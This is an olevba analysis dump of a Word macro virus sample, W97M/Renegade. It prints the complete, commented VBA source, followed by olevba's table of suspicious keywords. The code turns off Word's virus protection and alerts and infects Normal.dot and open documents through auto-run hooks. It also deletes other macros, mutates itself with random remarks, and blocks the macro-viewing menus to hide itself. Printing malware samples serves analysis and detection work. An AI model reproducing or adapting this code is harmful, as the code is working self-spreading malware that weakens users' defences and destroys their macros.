olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Reneg-19d8ec10cf427ed003904358cea906cec6edae00
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Reneg-19d8ec10cf427ed003904358cea906cec6edae00 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    ' The module name
    ' - will be used as infection marker
Sub Renegade()
    ' Our sub name
'W97M/Renegade
'Copyright (c) 1999, cry0tek
On Error Resume Next
    ' Error handler
    ' - If an error occurs, just proceed to the next instruction
With Options
 .ConfirmConversions = False
 .VirusProtection = False
    ' Disable virus protection
 .SaveNormalPrompt = False
    ' Disable prompts for saving normal.dot
End With
With ActiveDocument
 .ReadOnlyRecommended = False
    ' Make sure the document is not read only
 .Password = ""
 .WritePassword = ""
    ' No passwords please :)
End With
With Application
 .ScreenUpdating = False
    ' Disable screenupdating
 .DisplayAlerts = wdAlertsNone
    ' Show no alert message boxes to the user
 .EnableCancelKey = False
    ' Turn this off so that the user can't use ESC to cancel the execution of the macro
 .VBE.ActiveVBProject.VBComponents("Renegade").Export "c:\renegade.386"
    ' Export our code to c:\renegade.386
End With
With Dialogs(wdDialogFileSummaryInfo)
 .Author = "cry0tek"
 .Title = "W97M/Renegade Infected Document"
 .Subject = "Copyright (c) 1999, cry0tek"
 .Comments = "PutoksaKawayan" & vbCr & "Zoom23" & vbCr & "L0rz" & vbCr & "Yez" & vbCr & "Kinetic Stab"
 .Keywords = "Greetings to all vx'ers"
 .Execute
End With
    ' Place messages inside FileSummaryInfo
If Day(Now()) = 5 Then
 Assistant.Visible = True
 With Assistant.NewBalloon
  .Text = "W97M/Renegade"
  .Heading = "Infection successful.....you're dead..."
  .Animation = msoAnimationEmptyTrash
  .Show
 End With
End If
    ' Payload
    ' - show the office assistant
NormalAttrib = GetAttr(NormalTemplate.FullName)
If NormalAttrib = vbReadOnly Then GoTo Hell
If NormalAttrib = vbReadOnly + vbArchive Then GoTo Hell
    ' Check the attribute of Normal Template
    ' - If readonly or archive is true then get the hell out of here
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 Macro = ActiveDocument.VBProject.VBComponents(i).Name
 If Macro = "Renegade" Then DocInf = True
    ' If there is a module named as "Renegade" then the document is infected
 If (Macro <> "Renegade") And (Macro <> "ThisDocument") And (Macro <> "Reference To Normal") Then
  Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Macro, Object:=wdOrganizerObjectProjectItems
 End If
Next i
    ' If active document is infected, set flag for infected status
    ' Check if there are other macros inside, if so delete them
    ' - who knows, maybe other macro viruses are already inside the document :)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 Macro = NormalTemplate.VBProject.VBComponents(i).Name
 If Macro = "Renegade" Then GlobalInf = True
    ' If there is a module named as "Renegade" then the normal.dot is infected
 If (Macro <> "Renegade") And (Macro <> "ThisDocument") Then
  Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Macro, Object:=wdOrganizerObjectProjectItems
 End If
Next i
    ' If normal template is infected, set flag for infected status
    ' Check if there are other macros inside, if so delete them
    ' - who knows, maybe other macro viruses are already inside normal.dot :)
If DocInf = True And GlobalInf = False Then Set Target = NormalTemplate.VBProject.VBComponents
If DocInf = False And GlobalInf = True Then Set Target = ActiveDocument.VBProject.VBComponents
    ' Determine the target for infection
Target.Import "c:\renegade.386"
    ' Let's infect that by importing our code from the exported file
If DocInf = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If GlobalInf = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
    ' Make sure we save ourself
Kill "c:\renegade.386"
    ' Delete the exported code
Application.DisplayAlerts = wdAlertsAll
    ' Re-enable alert messages
    ' - we don't want users to see a blank message box :)
Hell:
End Sub
    ' End of sub
Sub Mutate()
    ' The mutation engine. Inserts random remarks.
    ' - pretty lame since it increases the size of the code
On Error Resume Next
For Grow = 1 To 5
 Number = MacroContainer.VBProject.VBComponents("Renegade").CodeModule.CountofLines
 RandomLine = Int(Rnd() * Number - 2)
    ' Grab a random line
 RemarkLength = Int(Rnd() * 40 + 1)
    ' Get the length of remark to be generated
 For Length = 1 To RemarkLength
  Remark = Remark + Chr$(Int((122 - 65 + 1) * Rnd + 65))
    ' Let's generate random characters for the remark
 Next Length
 MacroContainer.VBProject.VBComponents("Renegade").CodeModule.InsertLines RandomLine, "Rem " & Remark
    ' Then, insert those characters after the REM
 Remark = ""
    ' Null this one out since we do not want to reuse the previous inserted characters
Next Grow
End Sub
Sub FileClose()
On Error Resume Next
Call Mutate
    ' Let's only mutate each time a file is closed
Call Renegade
    ' Lets infect
If ActiveDocument.Saved = False Then ActiveDocument.Save
    ' If the document is not yet saved then save it
ActiveDocument.Close
End Sub
Sub AutoOpen()
On Error Resume Next
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub FileSave()
On Error Resume Next
Call Renegade
ActiveDocument.Save
    ' This is FileSave(), so do what we must :)
End Sub
Sub FileExit()
On Error Resume Next
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
    ' This is FileExit, so quit
End Sub
Sub ToolsOptions()
On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    ' Show the ToolsOptions dialog box
Call Renegade
End Sub
'------------------------------------------------------------------------------------------
' Basic stealth
'------------------------------------------------------------------------------------------
Sub ToolsMacro()
End Sub
Sub FileTemplate()
End Sub
Sub ViewVBCode()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

